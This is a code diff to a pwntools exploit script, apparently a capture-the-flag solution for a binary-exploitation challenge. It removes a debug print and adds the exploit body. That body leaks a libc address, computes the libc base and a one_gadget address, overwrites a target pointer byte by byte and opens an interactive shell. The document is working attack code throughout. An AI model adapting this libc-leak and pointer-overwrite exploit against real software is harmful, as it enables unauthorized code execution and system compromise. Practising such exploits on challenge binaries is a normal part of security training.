@@ -32,7 +32,6 @@ parser.add_argument('-p',type=int,help='remote port',metavar='RPORT')
 parser.add_argument('-l',help='libc - [xx] for v2.xx, or [/path/to/libc.so.6] to load a specific libc',default='23',metavar='LIBC')
 parser.add_argument('-d',help='disable DEBUG mode',action='store_true')
 args = parser.parse_args()
-print(args)
 
 binary = args.b
 context.binary = binary
@@ -76,7 +75,16 @@ def show(index):
 	sla(':',index)
 
 # start
-
+ru('0x')
+puts = int(ru('\n'),16)
+base,libc,system = leak_libc('puts',puts,libc)
+dl_got = base + 0x5f4038
+# one_gadget ./libc.so.6 -l2
+one = base + 0xe569f
+sla('shoot!shoot!\n',dl_got)
+sla('biang!\n',p8(one & 0xff))
+sla('biang!\n',p8((one>>8) & 0xff))
+sla('biang!\n',p8((one>>16) & 0xff))
 # end
 
 p.interactive()
